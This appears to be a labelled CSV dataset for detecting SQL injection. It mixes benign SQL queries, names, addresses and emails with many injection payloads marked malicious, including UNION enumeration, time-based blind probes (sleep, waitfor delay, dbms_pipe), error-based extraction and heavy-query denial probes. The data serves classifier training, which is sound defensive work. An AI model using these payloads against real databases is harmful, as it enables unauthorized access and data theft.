2969,0,0,0.004468253314358248
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",1,1,1.0
   (  select top 1,1,1,0.76
"select extract ( minute from ""2017-06-15 09:34:21"" ) ;",0,0,0.0
pueblica de valverde,0,0,0.0
select * from torn where addition like '%hide%',0,0,0.0
jed,0,0,0.004468253314358248
select avg ( funny ) from around,0,0,0.0
1'||  (  select 'pcps' from dual where 7255  =  7255 and 7121  =  4603,1,1,0.99
select   (  case when   (  8403  =  7151  )   then 8403 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,1.0
; begin declare @var varchar  (  8000  )   set @var  =  ' ...,1,0,0.43
"1""  )   as nraw where 7984  =  7984 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,1.0
" select column_name ( s )  from magnet,cannot",0,0,0.0
-8812 or 6872  =  6872# dflr,1,1,0.99
"1,  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,1,1.0
"-6095""   )    )    as kgfp where 3601  =  3601 or 7287  =  9373#",1,1,1.0
1'||  (  select 'fwph' where 3791  =  3791,1,1,1.0
najli,0,0,0.004468253314358248
"select id, post_title, post_name from wp_posts where post_type  =  'wpcf7_contact_form'",0,0,0.05
"-3415 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- jove",1,1,1.0
select lower ( customername )  as lowercasecustomername from customers;,0,0,0.0
marlow@botilleria.com.ec,0,0,0.0
"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",1,1,1.0
select bat ( s )  from sort union,0,0,0.0
verghese,0,0,0.004468253314358248
"  update group set tongue =  'bus', city =  'directly' where we =  seen",0,0,0.0
select avg ( price ) from quiet,0,0,0.0
select top 3 * from wire where theory = 'become',0,0,0.0
3339,0,0,0.004468253314358248
"1""   )    )    as jikg where 8258  =  8258 and   (  3973  =  1047  )  *1047--",1,1,1.0
igea,0,0,0.004468253314358248
"  select appleid as id, symbol as ride from stood",0,0,0.0
select time from flies,0,0,0.0
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'nsji'  =  'nsji",1,1,1.0
salter@quiromante.com.mg,0,0,0.0
"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1,1,1.0
-7532   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8332  =  8332,1,1,1.0
leopolda,0,0,0.004468253314358248
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,1,1.0
"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
"1'  )   union all select null,null,null,null,null#",1,1,1.0
"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",1,1,1.0
select * from excitement 3 select * from level,0,0,0.0
mikel,0,0,0.004468253314358248
select * from simply where hurried not like 'alphabet%',0,0,0.0
vinko,0,0,0.004468253314358248
2.21e+15,0,0,0.0
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",1,1,1.0
d75a4r45der,0,0,0.004468253314358248
"  select solveid as id, herself as near from owner",0,0,0.0
1  )   where 4600  =  4600 or sleep  (  5  )  --,1,1,1.0
"1%' union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
9270,0,0,0.004468253314358248
select count ( distinct climate )  from direction,0,0,0.0
" select * from users where id  =  1 %$ 1 union select null,@@version -- 1",1,1,1.0
"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
1317,0,0,0.004468253314358248
" select * from seems order by feathers, wave",0,0,0.0
"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",1,1,1.0
19133,0,0,0.004468253314358248
cijuela,0,0,0.004468253314358248
select * from can,0,0,0.0
select min ( evening )  as future from primitive,0,0,0.0
select * from nose where zero = 'slope'  and city = 'muscle',0,0,0.0
select * from halfway where appropriate = 'noted' fetch first 3 rows only,0,0,0.0
xaudiera alicea,0,0,0.004468253314358248
"-8703'  )   where 9723  =  9723 union all select 9723,9723,9723,9723,9723#",1,1,1.0
"1 union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
"  select * from certainly where own not in  ( 'your', 'idea', 'pocket' )  ",0,0,0.0
harmony,0,0,0.004468253314358248
"1""   )    )     )   and 9198  =  9198--",1,1,1.0
"-4980"" or   (  8459  =  8459  )  *4906 and ""mnlj"" like ""mnlj",1,1,0.99
select count ( cottonid ) from changing,0,0,0.0
select * from specific where various not like 'member%',0,0,0.0
"select column1 , column2, ... from table_name where condition1 or condition2 or condition3 ... ;",0,0,0.31
1'+  (  select tdkt where 4535  =  4535,1,1,1.0
delete from by,0,0,0.02
"-7941%'  )   union all select 6965,6965,6965,6965--",1,1,1.0
"  select orders.boyrid, employees.knowledge, employees.visit from ordersright join employees on orders.employeeid  =  employees.signalid order by orders.barkid",0,0,0.0
select kind from avoid union select hurt from fastened order by fort,0,0,0.0
p44m8scu6916n,0,0,0.004468253314358248
"insert into locate ( nose, fellow, heard, dance, angle, recall )  values  ( 'period', 'laugh'. collect', 'world', 'including', 'under', 'traffic' )  ",0,0,0.0
26527823z,0,0,0.004468253314358248
jocs olimpics 110 1-b,0,0,0.195
select * from substance fetch first 50 percent rows only,0,0,0.0
"-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--",1,1,1.0
select * from  ( select gently from act ) ,0,0,0.0
select * from area,0,0,0.0
select * from something where characteristic between '1996-07-01' and '1996-07-31',0,0,0.0
-4108'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'tqjx'  =  'tqjx,1,1,1.0
guadiana 149 6f,0,0,0.004468253314358248
"  update keep set rice =  'pine', city =  'tower' where birds =  split",0,0,0.0
refriega,0,0,0.004468253314358248
select top 3 * from round select * from pig 3select * from pan,0,0,0.0
delete from blind where doctor = 'palace',0,0,0.0
" select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",1,1,1.0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""ejmj"" like ""ejmj",1,1,0.99
henry,0,0,0.004468253314358248
silvie,0,0,0.004468253314358248
"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,1,1,0.99
"  select shout as pay, wish as [breakfast]  from port",0,0,0.0
-6637'   )    )    order by 1#,1,1,1.0
select *into customersgermany from customers where country  =  'germany';,0,0,0.01
marlet esparraguera,0,0,0.004468253314358248
"1%""   )    )     )   union all select null,null,null,null--",1,1,1.0
8449,0,0,0.004468253314358248
inciertamente,0,0,0.004468253314358248
1'   )    )    and sleep  (  5  )  #,1,1,1.0
select * from pile 3 select * from studied,0,0,0.0
"   select valuable, dozen, importancefrom curve where statement  is not null",0,0,0.0
"1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
select * from touch 3 select * from military,0,0,0.0
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,1,1.0
select * from personal 3,0,0,0.0
"1%""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,1,1,1.0
1  )   where 9708  =  9708,1,1,1.0
17889538t,0,0,0.004468253314358248
escribano peraldo,0,0,0.004468253314358248
select * from finally where silk = 'six'  or jet = 'rhyme',0,0,0.0
select * from lot  where there not like '[dozen]%',0,0,0.0
"  select weather as event, production as [inch]  from never",0,0,0.0
franklin,0,0,0.004468253314358248
select * from largest where rhythm = 'breathe',0,0,0.0
"1""  )   union all select null,null,null,null,null,null#",1,1,1.0
"1%""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
"c/ leopoldo alas ""clarin"" 4, 6?b",0,0,0.23
wailing@mariposasentudia.je,0,0,0.004468253314358248
select saddle ( s )  from key select there from paragraph,0,0,0.0
"create or replace function sleep  (  int  )   returns int as '/lib/libc.so.6','sleep' language 'c' strict",1,1,0.6233333333333333
"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'akyc'  =  'akyc",1,1,1.0
select monthname ( curdate (   )  )  ;,0,0,0.0
19223,0,0,0.004468253314358248
select gravity ( s ) from favorite inner join,0,0,0.0
1  )   as wshv where 5684  =  5684,1,1,1.0
5580,0,0,0.004468253314358248
select top 50 percent * from piano,0,0,0.0
33180,0,0,0.004468253314358248
lotera,0,0,0.004468253314358248
"1  )   where 9645  =  9645 union all select null,null,null--",1,1,1.0
"-6263%""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,1,1,1.0
"   select chamber, tired+ ', ' + certain+ ' ' + crew+ ', ' + suit as broke  from face",0,0,0.0
select origin from method union all select principle from battle order by one,0,0,0.0
select avg ( basic ) from belt select sum ( carefully ) ,0,0,0.0
select * from represent where exactly not like 'toy%',0,0,0.0
select between ( s )  from section select sides from managed,0,0,0.0
select * from remarkable 3 select * from end,0,0,0.05
select avg ( star ) from scientist,0,0,0.0
8.73e+15,0,0,0.0
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
5ecom058a?8a,0,0,0.004468253314358248
bears,0,0,0.004468253314358248
1  )   as vbli where 5139  =  5139 and 2782  =  2625--,1,1,1.0
1'+  (  select 'ueak' where 7329  =  7329 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',1,1,1.0
"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",1,1,1.0
"  select addtime ( ""2017-06-15   09:34:21.000001"", ""5 2:10:5.000003"" ) ;",0,0,0.0
45025499d,0,0,0.004468253314358248
28530,0,0,0.004468253314358248
broun_granlund@purplemoongrn.fi,0,0,0.004468253314358248
"-8331'  )   union all select 1452,1452,1452,1452,1452--",1,1,1.0
hembrick,0,0,0.004468253314358248
-2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,1,1,1.0
""" or """" """,1,1,1.0
"select concat_ws ( ""-"", ""sql"", ""tutorial"", ""is"", ""fun!"" )  as concatenatedstring;",0,0,0.21
"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
select * from science where matter between 'season' and 'sides',0,0,0.0
select   (  case when   (  4755  =  4784  )   then 1 else 4755*  (  select 4755 from master..sysdatabases  )   end  )  --,1,1,1.0
"select * from generate_series  (  7724,7724,case when   (  7724  =  8170  )   then 1 else 0 end  )   limit 1--",1,1,1.0
select top 3 * from queen select * from forest 3select * from wonder,0,0,0.0
select top ( s )  from wonder,0,0,0.0
kingslan,0,0,0.004468253314358248
"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",1,1,1.0
"  select * from willing where copper in  ( 'control', 'furniture', 'solution' )  ",0,0,0.0
select * from  ( select someone from nor ) ,0,0,0.0
-3582  )   where 5873  =  5873 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,1,1.0
1'||  (  select 'ogyu' from dual where 6691  =  6691,1,1,1.0
curul,0,0,0.004468253314358248
1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,0.99
50174,0,0,0.004468253314358248
obsequ.iosa,0,0,0.004468253314358248
6138,0,0,0.004468253314358248
select * from blind,0,0,0.0
select top 3 * from growth select * from catch 3select * from mainly,0,0,0.0
select top 3 * from program,0,0,0.0
select count ( earlier )  from experience,0,0,0.0
-8080'   )    )    order by 1#,1,1,1.0
"  update kitchen set wrote =  'ants', city =  'satellites' where we =  range",0,0,0.0
"1' in boolean mode  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
"olivar, 174,",0,0,0.004468253314358248
172,0,0,0.004468253314358248
poma gozalbo,0,0,0.004468253314358248
select riding ( s )  from whispered union,0,0,0.0
.corporativo,0,0,0.004468253314358248
select * from price where choice like '%wrapped%',0,0,0.0
1.07544e+15,0,0,0.0
"   select right, sea, row from purple where teach  is null",0,0,0.0
"1"" and make_set  (  6520  =  9958,9958  )  ",1,1,1.0
 (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7992  =  7992  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    ) ,1,1,1.0
" select * from fourth order by dust asc, talk desc",0,0,0.0
"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,1,1.0
select avg ( mark ) from crew select sum ( mine ) ,0,0,0.0
"   select television, rule, surfacefrom consonant where hunt  is not null",0,0,0.0
"  select somewhere,list,up from log left join orders on income.pieid =  later.disappear order by summer.coast",0,0,0.0
select count ( * )  as official,0,0,0.0
22468230j,0,0,0.004468253314358248
select * from lost,0,0,0.0
1'+  (  select 'jkgf' where 7487  =  7487,1,1,1.0
"select second ( ""2017-06-20 09:34:00.000023"" ) ;",0,0,0.01
"-5362  )   union all select 7297,7297,7297,7297,7297#",1,1,1.0
quintino,0,0,0.004468253314358248
select government from dull union select colony from fourth order by personal,0,0,0.0
25330,0,0,0.004468253314358248
select avg ( either ) from usual select sum ( effect ) ,0,0,0.0
"-8841%""  )   or 4361  =  1910",1,1,0.99
26%,1,1,0.9800939470890968
5696,0,0,0.004468253314358248
select them ( s )  from raw select vegetable ( s ) ,0,0,0.0
"1'   )    )    as fjbe where 4662  =  4662 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"1'||  (  select 'ojdz' where 7350  =  7350 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1,1,1.0
"1'||  (  select 'kgjk' where 3530  =  3530 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
"calle las artes, 90,",0,0,0.0
"carrer asturies, 49",0,0,0.0017317690642443234
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1,1,1.0
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",1,1,1.0
"-5572""  )   union all select 8131,8131#",1,1,1.0
"1   )    )    as queb where 2449  =  2449 union all select null,null#",1,1,1.0
4.97885e+15,0,0,0.0
16646,0,0,0.004468253314358248
select * from student where third = 'mistake'  or came = 'seems',0,0,0.0
select * from wp_posts left join wp_postmeta on  (  wp_posts.id  =  wp_postmeta.post_id  )  where  ( post_type  =  'page' and post_status  =  'publish' )  and wp_postmeta.meta_key  =  '_wp_page_template' and wp_postmeta.meta_value  =  'template/reset_password.php' order by wp_posts.post_title asc,0,0,0.04
"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,1,1.0
select * from individual where sugar between '1996-07-01' and '1996-07-31',0,0,0.0
perpi izurrieta,0,0,0.004468253314358248
"  update broad set moving =  'spin', city =  'mixture' where corn =  which",0,0,0.0
"-5625"" union all select 6087,6087,6087,6087,6087,6087--",1,1,1.0
select * from practical  where every not like '[calm]%',0,0,0.0
"calle santa teresa, 87 5?b",0,0,0.0
"1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--",1,1,1.0
"1'||  (  select 'ysij' from dual where 6140  =  6140 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",1,1,0.99
"1,  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",1,1,1.0
"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'usnh' like 'usnh",1,1,1.0
select avg ( suddenly )  from flame  select sum ( began ) ,0,0,0.0
select avg ( all )  from these  select sum ( jump ) ,0,0,0.01
select handle ( s )  from occur union,0,0,0.0
"  select * from daily where verb in  ( 'club', 'beyond', 'mud' )  ",0,0,0.0
"1%"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,1.0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",1,1,1.0
"-1722' union all select 1408,1408,1408#",1,1,1.0
"  select gentlyid as id, tea as hill from answer",0,0,0.0
8586,0,0,0.004468253314358248
select * from noun where not rod = 'younger'  and not for = 'balance',0,0,0.0
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,1,0.99
select count ( * )  as language,0,0,0.0
select * from pack fetch first 3 rows only select top 50 percent * from shown,0,0,0.0
"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",1,1,1.0
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'mnbg' like 'mnbg",1,1,1.0
"   select employees.show, count ( orders.copperid )  as forgetfrom    ( ordersinner join slept on orders.learnid  =  employees.filmid ) ",0,0,0.0
pau gargallo 120 8-b,0,0,4.624763506411604e-05
"1'   )    )    as kdwc where 5906  =  5906 union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
"   select vast, human, sweetfrom kitchen where sitting  is not null",0,0,0.0
select * from title 3,0,0,0.0
nona,0,0,0.004468253314358248
"1'||  (  select 'dujx' where 6896  =  6896 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"select t.*, tt.*, tr.object_id from wp_terms as t inner join wp_term_taxonomy as tt on t.term_id  =  tt.term_id inner join wp_term_relationships as tr on tr.term_taxonomy_id  =  tt.term_taxonomy_id where tt.taxonomy in  ( 'support_cat' )  and tr.object_id in  ( 262310, 262326, 262328 )  order by t.name asc",0,0,0.05
select * from jet where country between '1996-07-01' and '1996-07-31',0,0,0.0
waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp,1,1,1.0
" select column_name ( s )  from task,wolf",0,0,0.0
select century ( s )  from adventure,0,0,0.0
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lmjg"" like ""lmjg",1,1,1.0
9.31575e+15,0,0,0.0
"  select hour ( ""2017-06-20 09:34:00"" ) ;",0,0,0.01
"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,1,1.0
"-8923'+  (  select xgvz where 9858  =  9858 union all select 9858,9858,9858#",1,1,1.0
select avg ( nine )  from actually  select sum ( writer ) ,0,0,0.0
5exas9labo,0,0,0.004468253314358248
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,1,1.0
"-6971"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ifuh"" like ""ifuh",1,1,1.0
"   select employees.solution, count ( orders.braveid )  as fromfrom    ( ordersinner join limited on orders.hisid  =  employees.boundid ) ",0,0,0.0
select avg ( nose ) from lower,0,0,0.0
werkmeister@19horas.zr,0,0,0.004468253314358248
yoel,0,0,0.004468253314358248
homero,0,0,0.004468253314358248
select option_value from wp_options where option_name  =  'options_number_of_support_family' limit 1,0,0,0.0
"1'   )    )    as fusi where 2788  =  2788 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,1.0
8775,0,0,0.004468253314358248
9.36496e+14,0,0,0.0
select warm ( s )  from animal union,0,0,0.0
"  select * from getting where nine in  ( 'string', 'bone', 'judge' )  ",0,0,0.0
select * from star where price not between 10 and 20,0,0,0.0
select top 3 * from source where held = 'hard',0,0,0.0
select exist ( s )  from duty select rock ( s ) ,0,0,0.0
"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""pyfz"" like ""pyfz",1,1,1.0
"  select hiddenid as id, aid as fell from bet",0,0,0.0
5013,0,0,0.004468253314358248
select option_value from wp_options where option_name  =  'options_footer_button_1_text' limit 1,0,0,0.0
"insert into town  ( continued, order, would )  values  ( 'sell', 'cake', 'industrial' )  ",0,0,0.0
kellogg@viajesinternacionales.ne,0,0,0.004468253314358248
" select * from frozen order by over, former",0,0,0.0
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,1,1.0
" select * from having order by firm, dry",0,0,0.0
"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",1,1,1.0
"c/ juan carlos onetti 4, 1?d",0,0,0.0
3.30212e+15,0,0,0.0
"1%""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""%""  =  """,1,1,1.0
select avg ( fort ) from interior,0,0,0.0
0 or 1  =  1,1,1,0.92
ductilidad,0,0,0.004468253314358248
henry@sms24h.tr,0,0,0.004468253314358248
"-9566%""  )   union all select 7973,7973,7973,7973--",1,1,1.0
select top 50 percent * from thy,0,0,0.0
96110955g,0,0,0.004468253314358248
83607535m,0,0,0.004468253314358248
select brave from tongue union all select ought from business order by specific,0,0,0.0
select * from off order by wealth desc,0,0,0.0
nao,0,0,0.004468253314358248
"1' union all select null,null,null,null--",1,1,1.0
select count ( forest ) from visit,0,0,0.0
"  update bag set bottom =  'pie', city =  'yet' where mixture =  heading",0,0,0.0
select * from foot fetch first 50 percent rows onlyselect top 3 * from children,0,0,0.0
1oca,0,0,0.004468253314358248
" select * from balloon order by climate, mostly",0,0,0.0
donhierro,0,0,0.004468253314358248
"-7126'   )    )    as fzpp where 8078  =  8078 union all select 8078,8078,8078,8078,8078,8078,8078#",1,1,1.0
87,0,0,0.00019717233373454894
pernign,0,0,0.004468253314358248
miscelnea,0,0,0.004468253314358248
select * from  ( select troops from farm ) ,0,0,0.0
"   select employees.in, count ( orders.shoutid )  as paidfrom    ( ordersinner join never on orders.putid  =  employees.trailid ) ",0,0,0.0
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",1,1,0.99
1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',1,1,0.96
pasivamente,0,0,0.004468253314358248
"-9039'  )   union all select 8058,8058,8058,8058,8058--",1,1,1.0
delete from prize,0,0,0.0
select *from  ( selectcolumn_name ( s )  from,0,0,0.19
85089975a,0,0,0.004468253314358248
" select * from discovery order by hollow, guess",0,0,0.0
select count ( * )  as symbol,0,0,0.0
select count ( palaceid ) from went,0,0,0.0
46160431y,0,0,0.004468253314358248
charlot@ringringrent.rw,0,0,0.004468253314358248
ausent+e,0,0,0.00169781211722895
"1""  )   as ifgl where 2190  =  2190 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1,1,1.0
"1""  )   where 7452  =  7452",1,1,1.0
03307827j,0,0,0.004468253314358248
47172,0,0,0.004468253314358248
"1%'  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
select * from everything fetch first 50 percent rows only,0,0,0.0
select * from thee 3 select * from molecular,0,0,0.0
select * from quick,0,0,0.0
select * from grabbed fetch first 3 rows only select top 50 percent * from fresh,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 262331 )  order by meta_id asc",0,0,0.0
diy$ambo,0,0,0.004468253314358248
select swing ( s )  from whatever union all,0,0,0.0
"   select wood, hardly+ ', ' + mental+ ' ' + poor+ ', ' + getting as diagram  from vast",0,0,0.02
select * from center where inch between contrast09/01/1996your and send15/31/1996week,0,0,0.0
"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",1,1,1.0
select distinct business from plus,0,0,0.0
select * from breakfast where simplest between taste09/01/1996plastic and event15/31/1996because,0,0,0.0
select * from ahead fetch first 50 percent rows only,0,0,0.0
ti20,0,0,0.004468253314358248
"1  )   union all select null,null,null,null,null--",1,1,1.0
19310,0,0,0.004468253314358248
delete from tail,0,0,0.0
calle jeremias 14 7b,0,0,0.0
"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",1,1,1.0
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'hofy' like 'hofy",1,1,1.0
"1'||  (  select 'fcws' from dual where 9184  =  9184 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",1,1,1.0
